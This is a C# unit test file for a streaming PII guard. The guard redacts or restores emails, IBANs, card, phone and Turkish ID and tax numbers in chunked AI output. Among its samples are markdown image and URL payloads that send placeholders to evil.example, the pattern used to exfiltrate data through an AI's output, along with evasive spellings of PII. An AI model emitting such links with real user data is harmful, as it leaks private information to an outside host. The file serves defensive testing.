using System.Globalization;
using System.Text;
using Sentinel.Guardrails.Pii;

namespace Sentinel.Guardrails.Tests.Pii;

public sealed class StreamingOutputGuardTests
{
    private static readonly string[] Prose =
    [
        "Merhaba", "the", "account", "hesap", "numarası", "ile", "and", "please", "kontrol", "ediniz", "değer", "a",
        "b", "x", "İstanbul", "ödeme", "şube", "Vergi", "no:", "VKN", "Tax", "ID:", "IBAN:", "tel:", "card", "kart",
        "1.", "2)", "-", "—", ":", ",", ".", "(", ")", "[", "]", "[EMA", "IL_1", "[PHONE_", "2025-06-01",
        "01.06.2025", "14:30", "1.250,00", "v1.2.3.4.5", "%50", "#3", "😀", "TR", "TR33", "0006", "5", "05", "+",
        "+90", "1234", "**bold**", "`code`", "https://example.com/a?b=c", "ﬁ", "４２",
    ];

    private static readonly string[] Placeholders =
    [
        "[EMAIL_1]", "[PHONE_1]", "[IBAN_1]", "[EMAIL_7]", "[CARD_2]", "[TCKN_1]", "[IP_1]",
        "![x](https://evil.example/?q=[EMAIL_1])", "https://evil.example/[PHONE_1]", "www.x.example/[EMAIL_1]",
    ];

    private static readonly string[] Separators = [" ", " ", " ", " ", " ", " ", "\n", "", ", ", "  ", "\u00A0", "\u200B", ". ", " - "];

    [Fact]
    public void Streaming_output_equals_whole_text_output_for_every_split()
    {
        var random = new Random(20251006);
        var guard = Guards.Output();
        var redactor = Guards.Redactor();
        var withRestoredValues = 0;
        var withNewPlaceholders = 0;
        var streamedBeforeFlush = 0;
        var longTexts = 0;

        for (var iteration = 0; iteration < 400; iteration++)
        {
            var values = Enumerable.Range(0, 12).Select(_ => RandomPii(random)).ToArray();
            var callerPrompt = string.Join(" ve ", values.Where(_ => random.Next(2) == 0));
            var text = RandomText(random, values);

            var expectedVault = new PiiVault();
            redactor.Redact(callerPrompt, expectedVault, PiiOrigin.Caller);
            var actualVault = new PiiVault();
            redactor.Redact(callerPrompt, actualVault, PiiOrigin.Caller);

            var expected = guard.Apply(text, expectedVault);

            var stream = guard.CreateStream(actualVault);
            var output = new StringBuilder();
            foreach (var delta in RandomSplit(text, random))
            {
                output.Append(stream.Push(delta));
            }

            if (text.Length > 400)
            {
                longTexts++;
                streamedBeforeFlush += output.Length > 0 ? 1 : 0;
            }

            output.Append(stream.Flush());
            withRestoredValues += values.Any(v => !text.Contains(v, StringComparison.Ordinal) && expected.Contains(v, StringComparison.Ordinal)) ? 1 : 0;
            withNewPlaceholders += expectedVault.DistinctValues > CountCallerValues(redactor, callerPrompt) ? 1 : 0;

            Assert.True(
                expected == output.ToString(),
                $"Iteration {iteration}: streamed output differs.\nText:     {Escape(text)}\nExpected: {Escape(expected)}\nActual:   {Escape(output.ToString())}");
            Assert.Equal(expectedVault.DistinctValues, actualVault.DistinctValues);
            Assert.Equal(expectedVault.Occurrences.OrderBy(p => p.Key), actualVault.Occurrences.OrderBy(p => p.Key));
        }

        // The generator must actually exercise restoring, fresh redaction, long texts and early emission.
        Assert.True(withRestoredValues > 100, $"only {withRestoredValues} iterations restored a caller value");
        Assert.True(withNewPlaceholders > 200, $"only {withNewPlaceholders} iterations redacted new PII");
        Assert.True(longTexts > 100, $"only {longTexts} long texts");
        Assert.True(streamedBeforeFlush > longTexts * 0.9, $"only {streamedBeforeFlush}/{longTexts} long texts streamed before Flush");
    }

    private static int CountCallerValues(PiiRedactor redactor, string callerPrompt)
    {
        var vault = new PiiVault();
        redactor.Redact(callerPrompt, vault, PiiOrigin.Caller);
        return vault.DistinctValues;
    }

    [Fact]
    public void A_tax_keyword_streamed_long_before_the_number_still_counts()
    {
        var stream = Guards.Output().CreateStream(new PiiVault());

        var output = stream.Push("Firmanın vergi ") + stream.Push("numarası şudur: ") + stream.Push("12345") + stream.Push("67890 ") + stream.Push("tamam.") + stream.Flush();

        Assert.Equal("Firmanın vergi numarası şudur: [VKN_1] tamam.", output);
    }

    [Fact]
    public void A_placeholder_for_a_document_value_stays_masked_when_streamed()
    {
        var vault = new PiiVault();
        Guards.Redactor().Redact("Belgede: mehmet@corp.example", vault, PiiOrigin.Context);
        var stream = Guards.Output().CreateStream(vault);

        var output = stream.Push("İlgili kişi [EMA") + stream.Push("IL_1] ve yeni ") + stream.Push("ali@corp.example") + stream.Flush();

        Assert.Equal("İlgili kişi [EMAIL_1] ve yeni [EMAIL_2]", output);
    }

    [Fact]
    public void A_partially_streamed_iban_is_never_emitted_in_clear()
    {
        var stream = Guards.Output().CreateStream(new PiiVault());
        var output = new StringBuilder();

        foreach (var delta in new[] { "Hesap: TR33 ", "0006 1005 ", "1978 6457 ", "8413 26", " kayıtlıdır." })
        {
            var emitted = stream.Push(delta);
            Assert.DoesNotContain("0006", emitted, StringComparison.Ordinal);
            Assert.DoesNotContain("TR33", emitted, StringComparison.Ordinal);
            output.Append(emitted);
        }

        output.Append(stream.Flush());
        Assert.Equal("Hesap: [IBAN_1] kayıtlıdır.", output.ToString());
    }

    [Fact]
    public void A_placeholder_split_across_deltas_is_still_restored()
    {
        var vault = new PiiVault();
        vault.Protect(PiiType.Email, "ayse@example.com", PiiOrigin.Caller);
        var stream = Guards.Output().CreateStream(vault);

        var output = stream.Push("Merhaba [EM") + stream.Push("AIL") + stream.Push("_1], hoş geldiniz.") + stream.Flush();

        Assert.Equal("Merhaba ayse@example.com, hoş geldiniz.", output);
    }

    [Fact]
    public void Prose_without_digits_is_emitted_immediately()
    {
        var stream = Guards.Output().CreateStream(new PiiVault());

        Assert.Equal("Hello world, this is a test ", stream.Push("Hello world, this is a test "));
        Assert.Equal("of ", stream.Push("of stream"));
        Assert.Equal(string.Empty, stream.Push("ing."));
        Assert.Equal("streaming.", stream.Flush());
    }

    [Fact]
    public void Text_after_a_line_break_releases_a_complete_number()
    {
        var stream = Guards.Output().CreateStream(new PiiVault());

        Assert.Equal("Tel ", stream.Push("Tel 0532 123 45 67"));
        Assert.Equal("[PHONE_1]\n", stream.Push("\n"));
    }

    [Fact]
    public void Flush_on_an_empty_stream_returns_nothing()
    {
        var stream = Guards.Output().CreateStream(new PiiVault());
        Assert.Equal(string.Empty, stream.Push(string.Empty));
        Assert.Equal(string.Empty, stream.Flush());
    }

    private static string RandomPii(Random random)
    {
        string Card()
        {
            var (prefix, length) = random.Next(4) switch { 0 => ("4", 16), 1 => ("5", 16), 2 => ("37", 15), _ => ("9792", 16) };
            if (prefix == "5")
            {
                prefix = "5" + random.Next(1, 6).ToString(CultureInfo.InvariantCulture);
            }

            var pan = TestData.Card(prefix, length, random);
            return random.Next(3) switch { 0 => pan, 1 => TestData.Grouped(pan), _ => TestData.Grouped(pan).Replace(' ', '-') };
        }

        string Phone()
        {
            var n = $"5{random.Next(30, 60)}{random.Next(100, 1000)}{random.Next(10, 100)}{random.Next(10, 100)}";
            return random.Next(6) switch
            {
                0 => $"+90 {n[..3]} {n[3..6]} {n[6..8]} {n[8..]}",
                1 => $"0{n}",
                2 => $"0 {n[..3]} {n[3..6]} {n[6..8]} {n[8..]}",
                3 => $"(0212) {n[3..6]} {n[6..8]} {n[8..]}",
                4 => $"+44 20 {random.Next(1000, 10000)} {random.Next(1000, 10000)}",
                _ => n,
            };
        }

        string Iban()
        {
            var (country, length) = random.Next(3) switch { 0 => ("TR", 26), 1 => ("DE", 22), _ => ("NO", 15) };
            var iban = TestData.Iban(country, length, random);
            return random.Next(2) == 0 ? iban : TestData.Grouped(iban);
        }

        // Adversarial spellings: invisible characters inside, no-break spaces, full-width digits, a tax keyword far
        // ahead of its number, a card followed by more digit groups, an e-mail longer than the hold-back window.
        return random.Next(14) switch
        {
            0 => TestData.NationalId(random),
            1 => "VKN " + TestData.TaxNumber(random),
            2 => Iban(),
            3 => Card(),
            4 => Phone(),
            5 => $"user{random.Next(100)}.{(random.Next(2) == 0 ? "yılmaz" : "doe")}@example{random.Next(3)}.com",
            6 => $"10.{random.Next(256)}.{random.Next(256)}.{random.Next(256)}",
            7 => $"2001:db8::{random.Next(1, 0xffff):x}",
            8 => "4111" + string.Concat(Enumerable.Repeat(random.Next(3) switch { 0 => "\u200B", 1 => "\uFE0F", _ => "\U000E0041" }, random.Next(1, 40))) + "1111 1111 1111",
            9 => string.Join('\u00A0', TestData.Grouped(TestData.Card("4", 16, random)).Split(' ')),
            10 => string.Concat(TestData.NationalId(random).Select(c => (char)(c - '0' + 0xFF10))),
            11 => "Vergi " + new string('x', random.Next(0, 45)) + " " + TestData.TaxNumber(random),
            12 => TestData.Grouped(TestData.Card("5" + random.Next(1, 6).ToString(CultureInfo.InvariantCulture), 16, random)) + " " + random.Next(10, 13).ToString(CultureInfo.InvariantCulture) + " 27 " + random.Next(100, 1000).ToString(CultureInfo.InvariantCulture),
            _ => "ali." + new string('k', random.Next(30, 70)) + "@örnek-" + new string('d', random.Next(5, 40)) + ".com.tr",
        };
    }

    private static string RandomText(Random random, string[] values)
    {
        var builder = new StringBuilder();
        var fragments = random.Next(5, 70);
        for (var i = 0; i < fragments; i++)
        {
            var roll = random.Next(100);
            builder.Append(roll switch
            {
                < 45 => Prose[random.Next(Prose.Length)],
                < 70 => values[random.Next(values.Length)],
                < 80 => RandomPii(random),
                < 92 => Placeholders[random.Next(Placeholders.Length)],
                < 97 => string.Concat(Enumerable.Range(0, random.Next(1, 14)).Select(_ => random.Next(10))),
                _ => new string('a', random.Next(40, 700)) + (random.Next(2) == 0 ? "@example.com" : string.Empty),
            });
            builder.Append(Separators[random.Next(Separators.Length)]);
        }

        return builder.ToString();
    }

    private static IEnumerable<string> RandomSplit(string text, Random random)
    {
        var position = 0;
        while (position < text.Length)
        {
            var roll = random.Next(20);
            var size = roll switch
            {
                0 => 0,
                1 => random.Next(30, 120),
                _ => random.Next(1, 9),
            };

            size = Math.Min(size, text.Length - position);
            yield return text.Substring(position, size);
            position += size;
        }
    }

    private static string Escape(string text) => text.Replace("\n", "\\n", StringComparison.Ordinal);

    [Fact]
    public void A_caller_placeholder_streamed_into_a_url_stays_masked()
    {
        var vault = new PiiVault();
        vault.Protect(PiiType.Email, "ayse@example.com", PiiOrigin.Caller);
        var stream = Guards.Output().CreateStream(vault);

        var output = stream.Push("Resim: ![x](https://evil.exa") + stream.Push("mple/?q=") + stream.Push("[EMAIL_1]) ve [EMAIL_1]") + stream.Flush();

        Assert.Equal("Resim: ![x](https://evil.example/?q=[EMAIL_1]) ve ayse@example.com", output);
    }
}

